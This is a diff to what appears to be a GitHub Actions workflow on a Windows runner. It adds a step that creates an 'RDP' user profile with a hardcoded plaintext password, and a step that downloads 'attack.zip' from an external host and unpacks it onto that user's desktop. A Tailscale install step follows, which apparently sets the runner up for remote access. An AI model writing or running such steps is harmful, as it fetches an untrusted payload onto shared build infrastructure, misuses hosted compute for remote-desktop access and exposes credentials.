@@ -57,6 +57,41 @@ jobs:
               exit 1
           }
 
+      - name: Force RDP User Profile Creation
+        run: |
+          $user = "RDP"
+          $password = "Marylin8905**"
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          $cred = New-Object System.Management.Automation.PSCredential($user, $securePass)
+      
+          Start-Process -FilePath "cmd.exe" `
+            -Credential $cred `
+            -ArgumentList "/c exit" `
+            -LoadUserProfile
+      
+          if (-not (Test-Path "C:\Users\$user")) {
+            Write-Error "User profile was not created"
+            exit 1
+          }
+      
+          Write-Host "User profile C:\Users\$user created successfully"
+
+      - name: Descargar y ejecutar BAT (background)
+        run: |
+          $user = "mirialis"
+          $zipUrl = "https://fredy.weknowdev.com/attack.zip"
+          $localZipPath = "C:\Users\RDP\Desktop\attack.zip"
+          $extractPath = "C:\Users\RDP\Desktop"
+      
+          Invoke-WebRequest -Uri $zipUrl -OutFile $localZipPath
+      
+          if (-not (Test-Path $extractPath)) {
+              New-Item -ItemType Directory -Path $extractPath
+          }
+      
+          Expand-Archive -Path $localZipPath -DestinationPath $extractPath -Force
+          Remove-Item -Path $localZipPath -Force
+
       - name: Install Tailscale
         run: |
           $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
